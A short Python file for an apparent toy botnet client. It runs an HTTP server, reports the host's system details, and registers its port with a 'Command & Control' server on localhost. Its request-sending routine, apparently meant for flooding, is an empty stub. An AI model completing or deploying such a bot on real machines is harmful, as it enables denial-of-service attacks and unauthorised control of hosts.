import atexit
import contextlib
import platform
import requests
import socket
import json

from http.server import BaseHTTPRequestHandler, HTTPServer


class Bot(BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path == '/info':
            self.GET_info()
        elif self.path == '/status':
            self.send_response(200)
            self.end_headers()

        else:
            self.send_response(404)
            self.end_headers()

    def GET_info(self):
        self.send_response(200)
        info = platform.uname()._asdict()
        info['processor'] = platform.processor()
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(bytes(json.dumps(info), "utf-8"))

    def do_POST(self):
        if self.path == '/send-requests':
            self.send_requests(0, 0)

    def send_requests(self, url, n):
        for _ in range(n):
            pass


CNC_ADDR = "127.0.0.1"
CNC_PORT = 60000


def start(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((CNC_ADDR, CNC_PORT))
        s.send(str(port).encode('utf-8'))


def exit_handler():
    with contextlib.suppress(ConnectionRefusedError):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((CNC_ADDR, CNC_PORT))


if __name__ == '__main__':
    port = 8080

    bot = HTTPServer(('', port), Bot)

    try:
        start(port)
        print("Connected to the Command & Control")
        atexit.register(exit_handler)
        bot.serve_forever()
    except ConnectionRefusedError as e:
        print("Cannot establish the connection to Command & Control")
    except KeyboardInterrupt as e:
        pass
    finally:
        print("Closing program...")
